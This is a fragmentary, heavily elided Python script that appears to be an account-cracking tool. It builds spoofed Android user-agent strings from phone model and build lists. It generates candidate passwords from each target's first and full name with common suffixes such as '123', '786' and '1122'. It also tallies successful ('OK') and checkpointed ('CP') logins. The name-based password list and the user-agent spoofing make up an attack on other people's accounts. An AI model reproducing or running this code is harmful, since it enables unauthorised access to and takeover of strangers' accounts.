...
for xiaominok in range(10000):
	...
	buildz=random.choice(['N9F27M',
            ...
            'SP1A',
            'RKQ1'])
	redmi=random.choice(['220233L2G','220333QAG','22041219I','Redmi 3S'])
...
for samsz in range(10000):
	...
	buildz=random.choice(['N9F27M',
            ...
            'SP1A',
            'RKQ1'])
	xiaomi=random.choice(['SAMSUNG SM-N960N','SM-G991B','LG-H930','Redmi Note 5']) 
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					shinoby_pass.append(frs+'1')
					shinoby_pass.append(frs+'12')
					shinoby_pass.append(frs+'123')
					shinoby_pass.append(frs+'1234')
					shinoby_pass.append(frs+'12345')
					shinoby_pass.append(frs+'1122')
					shinoby_pass.append(frs+'786')
					shinoby_pass.append(full+'1')
					shinoby_pass.append(full+'12')
					shinoby_pass.append(full+'123')
					shinoby_pass.append(full+'1234')
					shinoby_pass.append(full+'12345')
					shinoby_pass.append(full+'786')
					shinoby_pass.append(full+'1122')
			else:
				if len(frs)<3:
...
def mobile(idf,shinoby_pass):
	...
	sys.stdout.write(f"\r {nimasi} {P}[{M}{loop}{N}/{M}{len(id)}{P}] {P}[{H}OK:{ok}{P}] {P}[{M}CP:{cp}{P}] [{H}{'{:.0%}'.format(loop/float(len(id)))}{P}]"),
	sys.stdout.flush()
